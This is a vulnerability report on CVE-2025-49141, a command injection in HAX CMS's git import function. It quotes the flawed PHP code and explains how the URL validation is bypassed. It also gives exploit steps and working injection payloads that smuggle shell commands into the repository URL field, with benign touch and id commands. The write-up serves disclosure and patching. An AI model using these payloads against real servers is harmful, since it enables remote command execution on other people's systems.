# CVE-2025-49141 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-49141
- **CWE ID**: CWE-78 (OS Command Injection)
- **Affected Software**: HAX CMS PHP
- **Affected Versions**: <= 10.0.6
- **Fixed Version**: 11.0.0
- **CVSS Score**: 8.6 (High)

## Vulnerability Details

The `gitImportSite` function in `Operations.php` obtains a URL string from a POST request and insufficiently validates user input. The `set_remote` function in `Git.php` later passes this input into `proc_open`, yielding OS command injection.

### Vulnerable Code

**Operations.php (line 2103-2118)**:
```php
public function gitImportSite() {
    if ($GLOBALS['HAXCMS']->validateRequestToken()) {
        if (isset($this->params['site']['git']['url'])) {
            $repoUrl = $this->params['site']['git']['url'];
            if (filter_var($repoUrl, FILTER_VALIDATE_URL) !== false &&
                strpos($repoUrl, '.git')) {
                // ...
                @$repo->set_remote("origin", $repoUrl);
            }
        }
    }
}
```

**Git.php (line 459-462)**:
```php
public function set_remote($destination, $url) {
    return $this->run("remote add $destination $url");
}
```

The `run()` function executes the command via `proc_open()` without proper input sanitization.

### Validation Bypass

The URL validation only checks:
1. `filter_var($repoUrl, FILTER_VALIDATE_URL)` - validates URL format
2. `strpos($repoUrl, '.git')` - checks for ".git" substring

Both checks can be bypassed with a payload like:
```
http://attacker.com/.git;COMMAND#=abc
```

- The URL passes `filter_var` validation
- Contains ".git" to pass `strpos` check
- Semicolon allows command chaining
- Hash symbol comments out remaining command parts

## Exploitation

### Prerequisites
- Authenticated access to HAX CMS (admin account)

### Attack Steps

1. Login to HAX CMS to obtain JWT token via `/system/api/login`
2. Send POST request to `/system/api/gitImportSite` with malicious URL and JWT:
```json
{
    "site": {
        "git": {
            "url": "http://127.0.0.1/.git;touch${IFS}/tmp/pwned;#a=b"
        }
    },
    "jwt": "JWT_TOKEN"
}
```
3. The command after semicolon executes on the server

### Payload Examples

Create file on server:
```
http://127.0.0.1/.git;touch${IFS}/tmp/pwned;#a=b
```

Execute command and save output:
```
http://127.0.0.1/.git;id>/tmp/output;#a=b
```

## Impact

An authenticated attacker can:
- Execute arbitrary OS commands on the backend server
- Exfiltrate sensitive data
- Modify or delete files
- Establish persistent access
- Compromise the entire server

## Remediation

Update to HAX CMS PHP version 11.0.0 or later, which properly sanitizes URL input before passing to shell commands.

## References

- https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
- https://nvd.nist.gov/vuln/detail/CVE-2025-49141
